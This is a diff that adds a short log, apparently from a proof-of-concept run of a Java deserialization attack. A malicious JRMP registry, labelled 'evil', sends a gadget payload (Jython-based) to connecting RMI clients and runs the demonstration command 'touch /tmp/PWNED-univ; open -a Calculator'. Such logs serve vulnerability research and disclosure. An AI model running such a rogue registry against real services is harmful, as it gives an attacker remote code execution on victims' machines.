@@ -1,0 +1,14 @@
+[evil] command: touch /tmp/PWNED-univ; open -a Calculator
+[evil] evil registry listening on :13100 (SSL JRMP)
+[evil] ssl probe listener on :13101
+[evil] jrmp connect from /192.168.65.1:50455
+[evil]   magic=0x4a524d49 ver=2 proto=0x4b
+[evil]   sending gadget as ReturnData
+Apr 16, 2026 7:24:00 AM org.python.core.PrePy maybeWrite
+WARNING: init: Bootstrap types weren't encountered in bootstrapping: [class org.python.core.PyType]
+This may be caused by compiled core classes preceding their exposed equivalents on the class path.
+[evil]   payload sent
+[evil] jrmp connect from /192.168.65.1:17399
+[evil]   magic=0x4a524d49 ver=2 proto=0x4b
+[evil]   sending gadget as ReturnData
+[evil]   payload sent
